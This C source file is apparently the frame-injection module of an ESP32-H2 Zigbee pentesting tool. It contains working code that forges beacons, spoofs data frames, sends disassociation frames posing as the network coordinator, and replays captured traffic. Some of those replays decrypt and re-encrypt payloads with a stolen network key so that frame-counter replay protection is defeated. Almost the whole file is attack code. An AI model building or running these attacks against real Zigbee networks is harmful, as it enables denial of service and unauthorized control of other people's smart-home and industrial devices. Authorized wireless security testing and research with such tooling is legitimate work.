/**
 * @file zigbee_injector.c
 * @brief IEEE 802.15.4 / Zigbee frame injection engine.
 *
 * Constructs and transmits valid 802.15.4 frames for pentesting:
 * raw injection, forged beacons, replay attacks, data frame spoofing,
 * and disassociation attacks.
 */

#include "zigbee_injector.h"
#include "ieee802154_hal.h"
#include "frame_parser.h"
#include "crypto.h"

#include <inttypes.h>
#include <string.h>
#include "esp_log.h"
#include "esp_timer.h"

static const char *TAG = "zigbee_injector";

/* ── State ────────────────────────────────────────────────────────── */

static bool     s_initialized = false;
static uint8_t  s_seq_num     = 0;       /**< Auto-incrementing sequence number */
static uint32_t s_tx_count    = 0;

/* ── Helpers ──────────────────────────────────────────────────────── */

/** Write uint16 little-endian into buffer, return bytes written. */
static inline uint8_t wr16(uint8_t *buf, uint16_t val)
{
    buf[0] = (uint8_t)(val & 0xFF);
    buf[1] = (uint8_t)((val >> 8) & 0xFF);
    return 2;
}

/**
 * Build a transmit buffer from an MPDU.
 *
 * The ESP32-H2 802.15.4 driver expects:
 *   tx_buf[0] = PHY length (MPDU length + 2 for FCS appended by HW)
 *   tx_buf[1..] = MPDU
 *
 * Returns total buffer length (1 + mpdu_len).
 */
static uint8_t build_tx_buf(uint8_t *tx_buf, const uint8_t *mpdu, uint8_t mpdu_len)
{
    tx_buf[0] = mpdu_len + 2; /* +2 for FCS */
    memcpy(&tx_buf[1], mpdu, mpdu_len);
    return 1 + mpdu_len;
}

/* ── Public API ───────────────────────────────────────────────────── */

esp_err_t zigbee_injector_init(void)
{
    if (s_initialized) return ESP_OK;

    s_seq_num    = 0;
    s_tx_count   = 0;
    s_initialized = true;

    ESP_LOGI(TAG, "Injector initialized");
    return ESP_OK;
}

esp_err_t zigbee_inject_raw(uint8_t *frame, uint8_t len)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (frame == NULL || len == 0 || len > 125) return ESP_ERR_INVALID_ARG;

    uint8_t tx_buf[128];
    uint8_t tx_len = build_tx_buf(tx_buf, frame, len);

    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);
    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGD(TAG, "Raw frame injected (%d bytes)", len);
    }
    return err;
}

esp_err_t zigbee_inject_beacon(uint16_t panid, uint8_t channel)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (channel < ZIGBLADE_CHANNEL_MIN || channel > ZIGBLADE_CHANNEL_MAX) {
        return ESP_ERR_INVALID_ARG;
    }

    /* Save current channel and switch */
    uint8_t prev_channel = zigblade_radio_get_channel();
    zigblade_radio_set_channel(channel);

    /*
     * Construct IEEE 802.15.4 beacon frame:
     *
     * FCF (2 bytes):
     *   Frame Type = 0 (Beacon)
     *   Security Enabled = 0
     *   Frame Pending = 0
     *   ACK Request = 0
     *   PAN ID Compression = 0
     *   Dest Addr Mode = 0 (None)
     *   Frame Version = 0
     *   Source Addr Mode = 2 (Short)
     *   = 0x8000
     *
     * Seq Num (1)
     * Source PAN ID (2)
     * Source Address (2) = 0x0000 (coordinator)
     *
     * Superframe Spec (2):
     *   Beacon Order = 15 (non-beacon)
     *   Superframe Order = 15
     *   Final CAP Slot = 15
     *   PAN Coordinator = 1
     *   Association Permit = 1
     *   = 0xCFFF
     *
     * GTS Spec (1) = 0x00
     * Pending Address Spec (1) = 0x00
     *
     * Zigbee Beacon Payload (15 bytes):
     *   Protocol ID (1) = 0x00
     *   Stack Profile / nwkProtocolVersion (1) = 0x22 (profile 2, version 2)
     *   Router Capacity / Device Depth (1) = 0x14
     *   End Device Capacity / Extended PAN (1) = 0x01
     *   Extended PAN ID (8) = all zeros
     *   TX Offset (3) = 0xFFFFFF (no TX offset)
     *   Update ID (1) = 0x00
     */

    uint8_t mpdu[40];
    uint8_t pos = 0;

    /* FCF: Beacon, Src Addr Mode = Short */
    uint16_t fcf = IEEE802154_FRAME_TYPE_BEACON  /* bits 0-2: frame type */
                 | (0x02 << 14);                 /* bits 14-15: src addr mode */
    pos += wr16(&mpdu[pos], fcf);

    /* Sequence number */
    mpdu[pos++] = s_seq_num++;

    /* Source PAN ID */
    pos += wr16(&mpdu[pos], panid);

    /* Source short address (coordinator = 0x0000) */
    pos += wr16(&mpdu[pos], 0x0000);

    /* --- Beacon payload --- */

    /* Superframe specification: non-beacon, association permit */
    uint16_t super = 0x0FFF  /* BO=15, SO=15, FinalCAP=15 */
                   | (1 << 14)  /* PAN coordinator */
                   | (1 << 15); /* Association permit */
    pos += wr16(&mpdu[pos], super);

    /* GTS specification: no GTS */
    mpdu[pos++] = 0x00;

    /* Pending address specification: none pending */
    mpdu[pos++] = 0x00;

    /* Zigbee beacon payload */
    mpdu[pos++] = 0x00;  /* Protocol ID = Zigbee */
    mpdu[pos++] = 0x22;  /* Stack profile 2, NWK protocol version 2 */
    mpdu[pos++] = 0x14;  /* Router capacity=1, device depth=2 */
    mpdu[pos++] = 0x01;  /* End device capacity=1 */

    /* Extended PAN ID (8 bytes, matching PAN ID for simplicity) */
    memset(&mpdu[pos], 0, 8);
    mpdu[pos]     = (uint8_t)(panid & 0xFF);
    mpdu[pos + 1] = (uint8_t)((panid >> 8) & 0xFF);
    pos += 8;

    /* TX offset (3 bytes, 0xFFFFFF = not available) */
    mpdu[pos++] = 0xFF;
    mpdu[pos++] = 0xFF;
    mpdu[pos++] = 0xFF;

    /* Update ID */
    mpdu[pos++] = 0x00;

    /* Transmit */
    uint8_t tx_buf[64];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, pos);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    /* Restore previous channel */
    zigblade_radio_set_channel(prev_channel);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGI(TAG, "Beacon injected: PAN=0x%04X ch=%d", panid, channel);
    }
    return err;
}

esp_err_t zigbee_inject_replay(const captured_packet_t *pkt)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (pkt == NULL) return ESP_ERR_INVALID_ARG;

    /* Use the raw frame from the captured packet */
    uint8_t raw_len = pkt->parsed.raw_len;
    if (raw_len == 0 || raw_len > 125) return ESP_ERR_INVALID_SIZE;

    /* Copy and optionally increment sequence number to avoid
       being filtered as a duplicate by the target */
    uint8_t mpdu[128];
    memcpy(mpdu, pkt->parsed.raw, raw_len);

    /* Sequence number is at byte 2 for standard frames */
    if (raw_len >= 3) {
        mpdu[2] = s_seq_num++;
    }

    /* Switch to the original capture channel */
    zigblade_radio_set_channel(pkt->channel);

    uint8_t tx_buf[130];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, raw_len);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGI(TAG, "Replay injected (%d bytes, ch=%d)", raw_len, pkt->channel);
    }
    return err;
}

esp_err_t zigbee_inject_data(uint16_t dst_short,
                             uint16_t src_short,
                             uint16_t panid,
                             const uint8_t *payload,
                             uint8_t len)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (payload == NULL || len == 0) return ESP_ERR_INVALID_ARG;

    /*
     * IEEE 802.15.4 Data frame with intra-PAN addressing:
     *
     * FCF (2):
     *   Frame Type = 1 (Data)
     *   PAN ID Compression = 1
     *   Dest Addr Mode = 2 (Short)
     *   Src Addr Mode = 2 (Short)
     *   = 0x8861
     *
     * Seq Num (1)
     * Dst PAN ID (2)
     * Dst Short Addr (2)
     * Src Short Addr (2) — no src PAN due to compression
     * Payload (variable)
     */

    uint8_t mpdu[128];
    uint8_t pos = 0;

    /* Maximum payload: 125 - 9 (header) = 116 bytes */
    if (len > 116) return ESP_ERR_INVALID_SIZE;

    /* FCF: Data frame, PAN ID compress, short/short addressing */
    uint16_t fcf = IEEE802154_FRAME_TYPE_DATA
                 | (1 << 6)      /* PAN ID compression */
                 | (0x02 << 10)  /* Dst addr mode: short */
                 | (0x02 << 14); /* Src addr mode: short */
    pos += wr16(&mpdu[pos], fcf);

    /* Sequence number */
    mpdu[pos++] = s_seq_num++;

    /* Destination PAN ID (only one PAN ID due to compression) */
    pos += wr16(&mpdu[pos], panid);

    /* Destination short address */
    pos += wr16(&mpdu[pos], dst_short);

    /* Source short address (spoofed) */
    pos += wr16(&mpdu[pos], src_short);

    /* Payload */
    memcpy(&mpdu[pos], payload, len);
    pos += len;

    uint8_t tx_buf[130];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, pos);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGI(TAG, "Data injected: 0x%04X -> 0x%04X (%d bytes payload)",
                 src_short, dst_short, len);
    }
    return err;
}

esp_err_t zigbee_inject_disassoc(uint16_t target_short,
                                 uint16_t panid,
                                 uint16_t coord_short)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;

    /*
     * IEEE 802.15.4 MAC Command frame — Disassociation Notification
     *
     * FCF (2):
     *   Frame Type = 3 (MAC Command)
     *   ACK Request = 1
     *   PAN ID Compression = 1
     *   Dest Addr Mode = 2 (Short)
     *   Src Addr Mode = 2 (Short)
     *   = 0x8863
     *
     * Seq Num (1)
     * Dst PAN ID (2)
     * Dst Short Addr (2) = target
     * Src Short Addr (2) = coordinator (spoofed)
     *
     * Command ID (1) = 0x03 (Disassociation Notification)
     * Disassociation Reason (1) = 0x02 (Coordinator wishes device to leave)
     */

    uint8_t mpdu[16];
    uint8_t pos = 0;

    /* FCF: MAC command, ack request, PAN compress, short/short */
    uint16_t fcf = IEEE802154_FRAME_TYPE_CMD
                 | (1 << 5)      /* ACK request */
                 | (1 << 6)      /* PAN ID compression */
                 | (0x02 << 10)  /* Dst addr mode: short */
                 | (0x02 << 14); /* Src addr mode: short */
    pos += wr16(&mpdu[pos], fcf);

    /* Sequence number */
    mpdu[pos++] = s_seq_num++;

    /* Destination PAN ID */
    pos += wr16(&mpdu[pos], panid);

    /* Destination address (target to disassociate) */
    pos += wr16(&mpdu[pos], target_short);

    /* Source address (spoofed as coordinator) */
    pos += wr16(&mpdu[pos], coord_short);

    /* MAC Command: Disassociation Notification */
    mpdu[pos++] = 0x03;  /* Command ID */

    /* Disassociation reason:
       0x01 = "The coordinator wishes the device to leave the PAN"
       0x02 = "The device wishes to leave the PAN"
       Use 0x01 since we're spoofing as the coordinator. */
    mpdu[pos++] = 0x01;

    uint8_t tx_buf[32];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, pos);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGW(TAG, "Disassoc injected: target=0x%04X PAN=0x%04X "
                 "(spoofed src=0x%04X)", target_short, panid, coord_short);
    }
    return err;
}

uint32_t zigbee_injector_get_tx_count(void)
{
    return s_tx_count;
}

/* ── Frame counter tracking ──────────────────────────────────────── */

static fc_track_entry_t s_fc_table[INJECTOR_FC_TRACK_MAX];
static uint8_t          s_fc_count = 0;

/**
 * Find or create a frame counter tracking entry.
 */
static fc_track_entry_t *fc_find(uint16_t short_addr, uint16_t panid)
{
    for (uint8_t i = 0; i < s_fc_count; i++) {
        if (s_fc_table[i].short_addr == short_addr &&
            s_fc_table[i].panid == panid) {
            return &s_fc_table[i];
        }
    }
    return NULL;
}

esp_err_t zigbee_injector_track_frame_counter(uint16_t short_addr,
                                              uint16_t panid,
                                              const uint8_t *ext_addr,
                                              uint32_t frame_counter)
{
    fc_track_entry_t *entry = fc_find(short_addr, panid);

    if (entry == NULL) {
        if (s_fc_count >= INJECTOR_FC_TRACK_MAX) {
            ESP_LOGW(TAG, "Frame counter table full");
            return ESP_ERR_NO_MEM;
        }
        entry = &s_fc_table[s_fc_count++];
        memset(entry, 0, sizeof(*entry));
        entry->short_addr = short_addr;
        entry->panid = panid;
    }

    /* Only update if the new counter is higher (monotonic) */
    if (frame_counter > entry->last_frame_counter) {
        entry->last_frame_counter = frame_counter;
    }

    if (ext_addr != NULL) {
        memcpy(entry->ext_addr, ext_addr, 8);
        entry->ext_addr_valid = true;
    }

    return ESP_OK;
}

esp_err_t zigbee_injector_get_frame_counter(uint16_t short_addr,
                                            uint16_t panid,
                                            uint32_t *fc_out)
{
    if (fc_out == NULL) return ESP_ERR_INVALID_ARG;

    const fc_track_entry_t *entry = fc_find(short_addr, panid);
    if (entry == NULL) {
        return ESP_ERR_NOT_FOUND;
    }

    *fc_out = entry->last_frame_counter;
    return ESP_OK;
}

esp_err_t zigbee_injector_clear_frame_counters(void)
{
    memset(s_fc_table, 0, sizeof(s_fc_table));
    s_fc_count = 0;
    ESP_LOGI(TAG, "Frame counter table cleared");
    return ESP_OK;
}

esp_err_t zigbee_inject_replay_with_counter(const captured_packet_t *pkt,
                                            const uint8_t *network_key,
                                            uint32_t fc_increment)
{
    if (!s_initialized) return ESP_ERR_INVALID_STATE;
    if (pkt == NULL || network_key == NULL) return ESP_ERR_INVALID_ARG;

    uint8_t raw_len = pkt->parsed.raw_len;
    if (raw_len == 0 || raw_len > 125) return ESP_ERR_INVALID_SIZE;

    /* We need a parsed MAC + NWK to locate the security header */
    if (!pkt->parsed.mac_valid || !pkt->parsed.nwk_valid) {
        ESP_LOGE(TAG, "Replay-with-counter requires parsed MAC+NWK layers");
        return ESP_ERR_INVALID_ARG;
    }

    if (!pkt->parsed.nwk.security) {
        ESP_LOGW(TAG, "Frame has no NWK security — use basic replay instead");
        return zigbee_inject_replay(pkt);
    }

    /* Copy the raw frame for modification */
    uint8_t mpdu[128];
    memcpy(mpdu, pkt->parsed.raw, raw_len);

    /*
     * NWK security header layout (after NWK header fields):
     *   Security Control (1 byte)
     *   Frame Counter (4 bytes, little-endian)
     *   Source Address (8 bytes, if key-id mode includes it)
     *   Key Sequence Number (1 byte)
     *
     * The frame counter starts at nwk.header_len - size_of_security_fields.
     * For typical Zigbee NWK frames the security header is right after
     * the basic NWK header.  The mac.header_len gives us the start of
     * the NWK layer.  We need to find the frame counter position.
     */

    /* NWK payload starts at mac.header_len.  The NWK security control
       byte is at nwk.header_len - (depends on sec fields).  For a
       typical frame: after the NWK basic header (8 bytes min) comes
       the security control byte, then the 4-byte frame counter.
       We use the parsed NWK header_len to find the security fields.
       The frame counter in the NWK security header is at a known
       offset from the NWK start: basic NWK header + 1 (sec ctrl). */

    uint8_t nwk_start = pkt->parsed.mac.header_len;
    /* Basic NWK header: fc(2) + dst(2) + src(2) + radius(1) + seq(1) = 8,
       but can be longer with IEEE addresses.  The security control byte
       immediately follows. */
    uint8_t nwk_basic_len = 8; /* minimal NWK header without IEEE addrs */
    if (pkt->parsed.nwk.dst_ieee_present) nwk_basic_len += 8;
    if (pkt->parsed.nwk.src_ieee_present) nwk_basic_len += 8;
    if (pkt->parsed.nwk.source_route) {
        /* Source route has relay count(1) + relay index(1) + relay list */
        /* Skip for simplicity — use nwk.header_len as fallback */
    }

    /* Security control byte offset */
    uint8_t sec_ctrl_off = nwk_start + nwk_basic_len;
    if (sec_ctrl_off + 5 > raw_len) {
        ESP_LOGE(TAG, "Cannot locate NWK frame counter in frame");
        return ESP_ERR_INVALID_SIZE;
    }

    /* Read the existing frame counter from the security header */
    uint8_t fc_off = sec_ctrl_off + 1; /* frame counter is right after sec ctrl */
    uint32_t old_fc = (uint32_t)mpdu[fc_off]        |
                      ((uint32_t)mpdu[fc_off + 1] << 8)  |
                      ((uint32_t)mpdu[fc_off + 2] << 16) |
                      ((uint32_t)mpdu[fc_off + 3] << 24);

    /* Look up tracked counter; use whichever is higher */
    uint16_t src_short = pkt->parsed.nwk.src_addr;
    uint16_t panid = pkt->parsed.mac.dst_panid;
    uint32_t tracked_fc = 0;
    if (zigbee_injector_get_frame_counter(src_short, panid, &tracked_fc) == ESP_OK) {
        if (tracked_fc > old_fc) {
            old_fc = tracked_fc;
        }
    }

    uint32_t new_fc = old_fc + fc_increment;

    ESP_LOGI(TAG, "Replay: FC %"PRIu32" -> %"PRIu32" (src=0x%04X)",
             old_fc, new_fc, src_short);

    /* Patch the frame counter in the copied frame */
    mpdu[fc_off]     = (uint8_t)(new_fc & 0xFF);
    mpdu[fc_off + 1] = (uint8_t)((new_fc >> 8) & 0xFF);
    mpdu[fc_off + 2] = (uint8_t)((new_fc >> 16) & 0xFF);
    mpdu[fc_off + 3] = (uint8_t)((new_fc >> 24) & 0xFF);

    /*
     * Re-encrypt the NWK payload with the new frame counter.
     *
     * We need:
     *   - Source extended address (for nonce derivation)
     *   - Security level from the security control byte
     *   - The plaintext payload (requires decrypting first with old nonce)
     */

    uint8_t sec_ctrl = mpdu[sec_ctrl_off];
    uint8_t sec_level = sec_ctrl & 0x07;
    uint8_t mic_len_val = zigbee_mic_len(sec_level);

    /* Determine source ext addr for nonce */
    uint8_t src_ext[8];
    bool have_ext = false;

    /* Check NWK security header for key source / source addr */
    uint8_t key_id_mode = (sec_ctrl >> 3) & 0x03;
    uint8_t after_fc = fc_off + 4;

    if (key_id_mode == 0 || key_id_mode == 1) {
        /* Source address is 8 bytes after frame counter (if present) */
        if (pkt->parsed.nwk.src_ieee_present) {
            memcpy(src_ext, pkt->parsed.nwk.src_ieee, 8);
            have_ext = true;
        }
    }

    /* Try tracked ext addr */
    if (!have_ext) {
        const fc_track_entry_t *entry = fc_find(src_short, panid);
        if (entry != NULL && entry->ext_addr_valid) {
            memcpy(src_ext, entry->ext_addr, 8);
            have_ext = true;
        }
    }

    if (!have_ext) {
        ESP_LOGE(TAG, "No source ext addr available for nonce — "
                 "cannot re-encrypt.  Sending with patched FC only.");
        /* Fall through and send without re-encryption — may still
           work against devices that don't verify MIC strictly */
    } else {
        /* Determine encrypted payload boundaries */
        /* Security header: sec_ctrl(1) + fc(4) + [src(8)] + key_seq(1) */
        uint8_t sec_hdr_len = 5; /* ctrl + fc */
        if (key_id_mode == 0) {
            /* No key source, no key sequence */
        } else if (key_id_mode == 1) {
            sec_hdr_len += 1; /* key sequence number */
        }
        /* Source address in NWK sec header (extended nonce bit) */
        bool ext_nonce = (sec_ctrl >> 5) & 0x01;
        if (ext_nonce) {
            sec_hdr_len += 8;
        }

        uint8_t enc_start = sec_ctrl_off + sec_hdr_len;
        if (enc_start + mic_len_val > raw_len) {
            ESP_LOGE(TAG, "Frame too short for encrypted payload");
            return ESP_ERR_INVALID_SIZE;
        }
        uint8_t enc_len = raw_len - enc_start - mic_len_val;
        uint8_t *enc_data = &mpdu[enc_start];
        uint8_t *mic_ptr  = &mpdu[enc_start + enc_len];

        /* AAD = everything from NWK start to encrypted payload */
        const uint8_t *aad = &mpdu[nwk_start];
        uint8_t aad_len = enc_start - nwk_start;

        /* Step 1: Decrypt with OLD nonce */
        uint8_t old_nonce[ZIGBEE_NONCE_LEN];
        zigbee_derive_nonce(src_ext, old_fc, sec_level, old_nonce);

        /* Save original encrypted data for rollback on failure */
        uint8_t saved_enc[128];
        uint8_t saved_mic[16];
        memcpy(saved_enc, enc_data, enc_len);
        memcpy(saved_mic, mic_ptr, mic_len_val);

        esp_err_t dec_err = zigbee_aes_ccm_decrypt(network_key, old_nonce,
                                                    enc_data, enc_len,
                                                    aad, aad_len,
                                                    saved_mic, mic_len_val);
        if (dec_err != ESP_OK) {
            ESP_LOGW(TAG, "Decryption with old FC failed — "
                     "trying raw FC-patched replay");
            /* Restore original encrypted data */
            memcpy(enc_data, saved_enc, enc_len);
            memcpy(mic_ptr, saved_mic, mic_len_val);
        } else {
            /* Step 2: Re-encrypt with NEW nonce (new frame counter) */
            uint8_t new_nonce[ZIGBEE_NONCE_LEN];
            zigbee_derive_nonce(src_ext, new_fc, sec_level, new_nonce);

            /* AAD now contains the patched frame counter already */
            uint8_t new_mic[16];
            esp_err_t enc_err = zigbee_aes_ccm_encrypt(network_key, new_nonce,
                                                        enc_data, enc_len,
                                                        aad, aad_len,
                                                        new_mic, mic_len_val);
            if (enc_err != ESP_OK) {
                ESP_LOGE(TAG, "Re-encryption failed");
                return enc_err;
            }

            /* Write new MIC */
            memcpy(mic_ptr, new_mic, mic_len_val);
            ESP_LOGD(TAG, "Frame re-encrypted with new FC");
        }
    }

    /* Update sequence number */
    if (raw_len >= 3) {
        mpdu[2] = s_seq_num++;
    }

    /* Update our tracked counter */
    zigbee_injector_track_frame_counter(src_short, panid, NULL, new_fc);

    /* Switch to capture channel and transmit */
    zigblade_radio_set_channel(pkt->channel);

    uint8_t tx_buf[130];
    uint8_t tx_len = build_tx_buf(tx_buf, mpdu, raw_len);
    esp_err_t err = zigblade_radio_transmit(tx_buf, tx_len);

    if (err == ESP_OK) {
        s_tx_count++;
        ESP_LOGI(TAG, "Counter-aware replay injected (FC=%"PRIu32", ch=%d)",
                 new_fc, pkt->channel);
    }
    return err;
}
